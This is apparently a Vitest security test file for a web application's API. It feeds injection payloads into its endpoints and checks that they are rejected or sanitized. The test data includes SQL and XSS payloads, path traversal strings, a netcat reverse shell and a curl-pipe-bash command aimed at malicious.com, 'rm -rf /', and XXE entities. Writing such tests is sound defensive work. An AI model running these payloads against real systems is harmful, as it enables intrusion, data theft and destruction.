import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { TestFactory, TestUtils, TestDataGenerators } from '@/test';

describe('Input Validation Security Tests', () => {
  describe('SQL Injection Prevention', () => {
    it('should sanitize SQL injection payloads in search queries', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; UPDATE users SET role='admin' WHERE email='victim@example.com'; --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' OR 1=1 LIMIT 1 OFFSET 1 --",
        "\"; DROP DATABASE truecrime; --",
        "' OR SLEEP(5) --",
        "' OR pg_sleep(5) --",
        "1'; EXEC xp_cmdshell('dir'); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const searchResult = await TestUtils.searchContent({
          query: payload,
          page: 1,
          limit: 20,
        });

        // Should return safe results, not execute SQL
        expect(searchResult.statusCode).toBe(200);
        expect(searchResult.data).toBeDefined();
        expect(Array.isArray(searchResult.data.results)).toBe(true);
        
        // Query should be treated as literal search text
        expect(searchResult.data.results).toEqual(
          expect.arrayContaining([])
        ); // Likely no legitimate content matches these strings
        
        // Should not cause database errors
        expect(searchResult.error).toBeUndefined();
      }
    });

    it('should prevent SQL injection in user registration', async () => {
      const maliciousInputs = [
        {
          field: 'email',
          values: [
            "admin@example.com'; DROP TABLE users; --",
            "test' OR '1'='1' --@example.com",
            "'; UPDATE users SET role='admin'; --@example.com",
          ],
        },
        {
          field: 'firstName',
          values: [
            "John'; DROP TABLE users; --",
            "'; UPDATE users SET password='hacked'; --",
            "Robert' OR '1'='1",
          ],
        },
        {
          field: 'lastName',
          values: [
            "Smith'; DROP TABLE users; --",
            "'; INSERT INTO users (role) VALUES ('admin'); --",
            "Johnson' UNION SELECT * FROM secrets --",
          ],
        },
      ];

      for (const input of maliciousInputs) {
        for (const maliciousValue of input.values) {
          const registrationData = TestFactory.createRegistrationInput();
          registrationData[input.field] = maliciousValue;

          const response = await TestUtils.registerUser(registrationData);

          // Should either reject the input or sanitize it
          if (response.statusCode === 200) {
            // If accepted, verify the stored value is sanitized
            const storedUser = response.data.user;
            expect(storedUser[input.field]).not.toContain('DROP');
            expect(storedUser[input.field]).not.toContain('UPDATE');
            expect(storedUser[input.field]).not.toContain('INSERT');
            expect(storedUser[input.field]).not.toContain('--');
          } else {
            // Should be rejected with validation error
            expect(response.statusCode).toBe(400);
            expect(response.error.code).toBe('BAD_REQUEST');
          }
        }
      }
    });

    it('should prevent NoSQL injection attacks', async () => {
      const noSQLInjectionPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "function() { return true; }"}',
        '{"$regex": ".*"}',
        '{"$or": [{"password": {"$exists": true}}, {"role": "admin"}]}',
        '{"password": {"$nin": [""]}}',
        '{"$expr": {"$eq": [1, 1]}}',
      ];

      for (const payload of noSQLInjectionPayloads) {
        // Test in various contexts where NoSQL might be used
        const contexts = [
          { endpoint: '/api/trpc/content.search', field: 'query' },
          { endpoint: '/api/trpc/auth.login', field: 'email' },
          { endpoint: '/api/trpc/user.updateProfile', field: 'preferences' },
        ];

        for (const context of contexts) {
          const requestData = TestFactory.createValidRequestData(context.endpoint);
          requestData[context.field] = payload;

          const response = await TestUtils.makeRequest(context.endpoint, {
            method: 'POST',
            body: requestData,
          });

          // Should not return sensitive data or cause injection
          if (response.statusCode === 200) {
            // Verify response doesn't contain injected data
            const responseStr = JSON.stringify(response.data);
            expect(responseStr).not.toContain('$gt');
            expect(responseStr).not.toContain('$where');
            expect(responseStr).not.toContain('function()');
          }
        }
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should sanitize XSS payloads in user inputs', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(1)">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import "javascript:alert(\'XSS\')"</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        '<form><button formaction="javascript:alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\'; alert("XSS"); //',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
      ];

      const inputFields = [
        { endpoint: '/api/trpc/auth.register', field: 'firstName' },
        { endpoint: '/api/trpc/auth.register', field: 'lastName' },
        { endpoint: '/api/trpc/user.updateProfile', field: 'displayName' },
        { endpoint: '/api/trpc/content.updateProgress', field: 'notes' },
        { endpoint: '/api/trpc/content.search', field: 'query' },
      ];

      for (const payload of xssPayloads) {
        for (const inputField of inputFields) {
          const requestData = TestFactory.createValidRequestData(inputField.endpoint);
          requestData[inputField.field] = payload;

          const response = await TestUtils.makeRequest(inputField.endpoint, {
            method: 'POST',
            body: requestData,
          });

          if (response.statusCode === 200) {
            // Verify stored/returned data is sanitized
            const responseData = response.data;
            const sanitizedValue = responseData[inputField.field] || 
              responseData.user?.[inputField.field] ||
              (responseData.results && responseData.results.length > 0 ? 
                responseData.results[0][inputField.field] : null);

            if (sanitizedValue) {
              // Should not contain executable script tags
              expect(sanitizedValue).not.toContain('<script');
              expect(sanitizedValue).not.toContain('onerror=');
              expect(sanitizedValue).not.toContain('onload=');
              expect(sanitizedValue).not.toContain('javascript:');
              expect(sanitizedValue).not.toContain('alert(');
              
              // Check for common XSS bypasses
              expect(sanitizedValue.toLowerCase()).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/);
              expect(sanitizedValue.toLowerCase()).not.toMatch(/on\w+\s*=/);
            }
          }
        }
      }
    });

    it('should handle URL-based XSS attempts', async () => {
      const urlXSSPayloads = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:msgbox("XSS")',
        'file:///etc/passwd',
        'ftp://malicious.com/steal-data',
        'https://malicious.com/steal-cookies',
      ];

      for (const payload of urlXSSPayloads) {
        // Test in contexts where URLs might be processed
        const urlContexts = [
          { endpoint: '/api/trpc/user.updateProfile', field: 'avatar' },
          { endpoint: '/api/trpc/content.report', field: 'reportUrl' },
          { endpoint: '/api/trpc/user.addLink', field: 'url' },
        ];

        for (const context of urlContexts) {
          const requestData = TestFactory.createValidRequestData(context.endpoint);
          requestData[context.field] = payload;

          const response = await TestUtils.makeRequest(context.endpoint, {
            method: 'POST',
            body: requestData,
          });

          // Should reject dangerous URLs or sanitize them
          if (response.statusCode === 200) {
            const storedUrl = response.data[context.field];
            if (storedUrl) {
              expect(storedUrl).not.toMatch(/^javascript:/);
              expect(storedUrl).not.toMatch(/^data:text\/html/);
              expect(storedUrl).not.toMatch(/^vbscript:/);
              expect(storedUrl).not.toMatch(/^file:\/\//);
            }
          } else {
            // Should be rejected with validation error
            expect(response.statusCode).toBe(400);
          }
        }
      }
    });

    it('should prevent DOM-based XSS in API responses', async () => {
      // Test that API responses don't contain unescaped user input
      const maliciousInput = '<script>alert("XSS")</script>';
      
      const user = TestFactory.createUser({
        firstName: maliciousInput,
        lastName: maliciousInput,
        displayName: maliciousInput,
      });

      const response = await TestUtils.getUserProfile(user.id, user);

      // Response should have escaped or sanitized the input
      const responseStr = JSON.stringify(response);
      expect(responseStr).not.toContain('<script>alert("XSS")</script>');
      
      // If the input was preserved, it should be escaped
      if (responseStr.includes('script')) {
        expect(responseStr).toMatch(/&lt;script&gt;|\\u003cscript\\u003e/);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc//passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\\\\....\\\\....\\\\windows\\\\win.ini',
        '/var/www/../../etc/passwd',
        'C:\\windows\\system32\\config\\sam',
        '../../../../../../proc/version',
        '../../../var/log/messages',
      ];

      const fileOperations = [
        { endpoint: '/api/trpc/user.uploadAvatar', field: 'filename' },
        { endpoint: '/api/trpc/content.uploadImage', field: 'path' },
        { endpoint: '/api/trpc/admin.downloadLog', field: 'logFile' },
      ];

      for (const payload of pathTraversalPayloads) {
        for (const operation of fileOperations) {
          const requestData = TestFactory.createValidRequestData(operation.endpoint);
          requestData[operation.field] = payload;

          const response = await TestUtils.makeRequest(operation.endpoint, {
            method: 'POST',
            body: requestData,
          });

          // Should reject path traversal attempts
          expect(response.statusCode).not.toBe(200);
          if (response.statusCode !== 403) {
            expect(response.statusCode).toBe(400);
            expect(response.error.message).toMatch(/invalid|path|file/i);
          }

          // Should not return system file contents
          if (response.data) {
            const dataStr = JSON.stringify(response.data);
            expect(dataStr).not.toMatch(/root:x:|daemon:|www-data:/);
            expect(dataStr).not.toMatch(/\[boot loader\]|\[operating systems\]/);
            expect(dataStr).not.toMatch(/Linux version|GNU\/Linux/);
          }
        }
      }
    });

    it('should validate file upload paths', async () => {
      const dangerousFilenames = [
        '../../../malicious.exe',
        'config.php',
        '.htaccess',
        'web.config',
        'index.php',
        '..\\..\\system32\\cmd.exe',
        'passwd',
        'shadow',
        '.env',
        '.git/config',
        'package.json',
        '../../../../etc/hosts',
      ];

      for (const filename of dangerousFilenames) {
        const uploadResult = await TestUtils.uploadFile({
          filename,
          content: Buffer.from('test content'),
          mimeType: 'text/plain',
        });

        // Should reject dangerous filenames
        expect(uploadResult.statusCode).not.toBe(200);
        expect(uploadResult.error).toBeDefined();
        
        if (uploadResult.statusCode !== 403) {
          expect(uploadResult.error.message).toMatch(/filename|path|invalid/i);
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent OS command injection', async () => {
      const commandInjectionPayloads = [
        '; cat /etc/passwd',
        '| ls -la',
        '`whoami`',
        '$(id)',
        '&& rm -rf /',
        '; curl http://malicious.com/steal',
        '| nc -e /bin/sh malicious.com 4444',
        '; python -c "import os; os.system(\'ls\')"',
        '`python -c "print(\'injected\')"',
        '$(curl -s http://malicious.com/payload.sh | bash)',
        '; powershell -Command "Get-Process"',
        '| cmd /c "dir c:\\"',
      ];

      const contexts = [
        { endpoint: '/api/trpc/content.search', field: 'query' },
        { endpoint: '/api/trpc/user.updateProfile', field: 'displayName' },
        { endpoint: '/api/trpc/admin.runMaintenance', field: 'command' },
      ];

      for (const payload of commandInjectionPayloads) {
        for (const context of contexts) {
          const requestData = TestFactory.createValidRequestData(context.endpoint);
          requestData[context.field] = payload;

          const response = await TestUtils.makeRequest(context.endpoint, {
            method: 'POST',
            body: requestData,
          });

          // Should not execute commands or return command output
          if (response.statusCode === 200 && response.data) {
            const responseStr = JSON.stringify(response.data);
            
            // Should not contain typical command outputs
            expect(responseStr).not.toMatch(/root:|daemon:|bin:|sys:/); // /etc/passwd
            expect(responseStr).not.toMatch(/drwx|total \d+/); // ls output
            expect(responseStr).not.toMatch(/uid=\d+|gid=\d+/); // id output
            expect(responseStr).not.toMatch(/\w+\.exe|\w+\.dll/); // Windows files
            expect(responseStr).not.toContain('injected'); // Python injection test
          }
        }
      }
    });

    it('should sanitize shell metacharacters', async () => {
      const shellMetacharacters = [
        ';', '|', '&', '`', '$', '(', ')', '{', '}',
        '\\', '"', "'", '<', '>', '*', '?', '[', ']',
        '~', '#', '%', '\n', '\r',
      ];

      for (const char of shellMetacharacters) {
        const payload = `test${char}command`;
        
        const searchResult = await TestUtils.searchContent({
          query: payload,
          page: 1,
          limit: 10,
        });

        // Should handle the input safely
        expect(searchResult.statusCode).toBe(200);
        
        if (searchResult.data) {
          // Input should be treated as literal search text
          expect(searchResult.data.results).toBeInstanceOf(Array);
        }
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection attacks', async () => {
      const ldapInjectionPayloads = [
        '*',
        '*)(&',
        '*))%00',
        '*()|(&(objectClass=*)',
        '*)((|(mail=*)(uid=*))',
        '*)(uid=*))(|(uid=*',
        '*)(cn=*))(|(cn=*',
        '*))(|(password=*',
        '*))%00(|(mail=*',
      ];

      // Assuming LDAP is used for authentication or user lookup
      for (const payload of ldapInjectionPayloads) {
        const contexts = [
          { endpoint: '/api/trpc/auth.login', field: 'email' },
          { endpoint: '/api/trpc/admin.findUser', field: 'searchTerm' },
          { endpoint: '/api/trpc/user.validateEmail', field: 'email' },
        ];

        for (const context of contexts) {
          const requestData = TestFactory.createValidRequestData(context.endpoint);
          requestData[context.field] = payload;

          const response = await TestUtils.makeRequest(context.endpoint, {
            method: 'POST',
            body: requestData,
          });

          // Should not return excessive data or cause LDAP errors
          if (response.statusCode === 200) {
            // Should not return more data than expected
            if (response.data && response.data.results) {
              expect(response.data.results.length).toBeLessThan(1000);
            }
          } else {
            // Should handle invalid input gracefully
            expect([400, 401, 422]).toContain(response.statusCode);
          }
        }
      }
    });
  });

  describe('XML/XXE Prevention', () => {
    it('should prevent XML External Entity (XXE) attacks', async () => {
      const xxePayloads = [
        `<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
         <data>&xxe;</data>`,
        
        `<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious.com/steal">]>
         <data>&xxe;</data>`,
        
        `<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://malicious.com/dtd">%xxe;]>
         <data>test</data>`,
        
        `<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
         <html><body>&xxe;</body></html>`,
      ];

      const xmlEndpoints = [
        { endpoint: '/api/trpc/content.importData', field: 'xmlData' },
        { endpoint: '/api/trpc/admin.uploadConfig', field: 'configXml' },
        { endpoint: '/api/trpc/user.importProfile', field: 'profileData' },
      ];

      for (const payload of xxePayloads) {
        for (const endpoint of xmlEndpoints) {
          const response = await TestUtils.makeRequest(endpoint.endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/xml' },
            body: payload,
          });

          // Should not process external entities or return file contents
          if (response.statusCode === 200 && response.data) {
            const responseStr = JSON.stringify(response.data);
            
            // Should not contain system file contents
            expect(responseStr).not.toMatch(/root:|daemon:|sys:/);
            expect(responseStr).not.toMatch(/\[boot loader\]/);
            expect(responseStr).not.toMatch(/; for 16-bit app support/);
          } else {
            // Should reject malicious XML
            expect([400, 415, 422]).toContain(response.statusCode);
          }
        }
      }
    });
  });

  describe('Input Length and Rate Limiting', () => {
    it('should enforce maximum input lengths', async () => {
      const oversizedInputs = [
        { field: 'firstName', maxLength: 50, testLength: 1000 },
        { field: 'lastName', maxLength: 50, testLength: 1000 },
        { field: 'displayName', maxLength: 100, testLength: 2000 },
        { field: 'query', maxLength: 200, testLength: 5000 },
        { field: 'notes', maxLength: 1000, testLength: 10000 },
        { field: 'description', maxLength: 2000, testLength: 50000 },
      ];

      for (const input of oversizedInputs) {
        const oversizedValue = 'A'.repeat(input.testLength);
        
        const contexts = [
          { endpoint: '/api/trpc/auth.register', applicable: ['firstName', 'lastName'] },
          { endpoint: '/api/trpc/user.updateProfile', applicable: ['firstName', 'lastName', 'displayName'] },
          { endpoint: '/api/trpc/content.search', applicable: ['query'] },
          { endpoint: '/api/trpc/content.updateProgress', applicable: ['notes'] },
        ];

        for (const context of contexts) {
          if (!context.applicable.includes(input.field)) continue;

          const requestData = TestFactory.createValidRequestData(context.endpoint);
          requestData[input.field] = oversizedValue;

          const response = await TestUtils.makeRequest(context.endpoint, {
            method: 'POST',
            body: requestData,
          });

          // Should reject oversized input
          expect(response.statusCode).toBe(400);
          expect(response.error.code).toBe('BAD_REQUEST');
          expect(response.error.message).toMatch(/length|long|size/i);
        }
      }
    });

    it('should implement request size limits', async () => {
      // Create an extremely large request payload
      const largePayload = {
        ...TestFactory.createRegistrationInput(),
        largeField: 'X'.repeat(10 * 1024 * 1024), // 10MB
      };

      const response = await TestUtils.makeRequest('/api/trpc/auth.register', {
        method: 'POST',
        body: largePayload,
      });

      // Should reject oversized requests
      expect(response.statusCode).toBe(413); // Payload Too Large
    });

    it('should implement rate limiting for input validation failures', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '; cat /etc/passwd',
        '*)(uid=*))(|(uid=*',
      ];

      // Make many requests with malicious input rapidly
      const promises = [];
      for (let i = 0; i < 50; i++) {
        const payload = maliciousInputs[i % maliciousInputs.length];
        promises.push(
          TestUtils.makeRequest('/api/trpc/content.search', {
            method: 'POST',
            body: { query: payload },
          })
        );
      }

      const responses = await Promise.all(promises);

      // Should start rate limiting after too many malicious requests
      const rateLimitedResponses = responses.filter(r => r.statusCode === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(5);
    });
  });

  describe('Content Security Policy Validation', () => {
    it('should validate and sanitize user-generated content', async () => {
      const userContent = [
        {
          type: 'profile_bio',
          content: 'I love <b>true crime</b> shows! Check out my <a href="https://example.com">blog</a>.',
          expectedSanitized: 'I love true crime shows! Check out my blog.',
        },
        {
          type: 'review_text',
          content: 'This show was <script>alert("XSS")</script> amazing!',
          expectedSanitized: 'This show was  amazing!',
        },
        {
          type: 'comment',
          content: 'Visit my site: <iframe src="javascript:alert(1)"></iframe>',
          expectedSanitized: 'Visit my site: ',
        },
      ];

      for (const content of userContent) {
        const response = await TestUtils.saveUserContent(content.type, content.content);

        expect(response.statusCode).toBe(200);
        
        if (response.data.sanitizedContent) {
          // Should remove dangerous HTML but preserve safe formatting
          expect(response.data.sanitizedContent).not.toContain('<script');
          expect(response.data.sanitizedContent).not.toContain('<iframe');
          expect(response.data.sanitizedContent).not.toContain('javascript:');
        }
      }
    });

    it('should implement file upload security', async () => {
      const dangerousFiles = [
        { filename: 'malware.exe', mimeType: 'application/x-msdownload' },
        { filename: 'script.php', mimeType: 'application/x-httpd-php' },
        { filename: 'shell.jsp', mimeType: 'application/x-jsp' },
        { filename: 'config.asp', mimeType: 'application/x-asp' },
        { filename: 'backdoor.cgi', mimeType: 'application/x-cgi' },
      ];

      const allowedFiles = [
        { filename: 'profile.jpg', mimeType: 'image/jpeg' },
        { filename: 'avatar.png', mimeType: 'image/png' },
        { filename: 'banner.gif', mimeType: 'image/gif' },
        { filename: 'document.pdf', mimeType: 'application/pdf' },
      ];

      // Test dangerous files are rejected
      for (const file of dangerousFiles) {
        const uploadResult = await TestUtils.uploadFile({
          filename: file.filename,
          content: Buffer.from('test content'),
          mimeType: file.mimeType,
        });

        expect(uploadResult.statusCode).not.toBe(200);
        expect(uploadResult.error.message).toMatch(/file type|extension|not allowed/i);
      }

      // Test allowed files are accepted
      for (const file of allowedFiles) {
        const uploadResult = await TestUtils.uploadFile({
          filename: file.filename,
          content: Buffer.from('test content'),
          mimeType: file.mimeType,
        });

        expect(uploadResult.statusCode).toBe(200);
        expect(uploadResult.data.filename).toBe(file.filename);
      }
    });
  });
});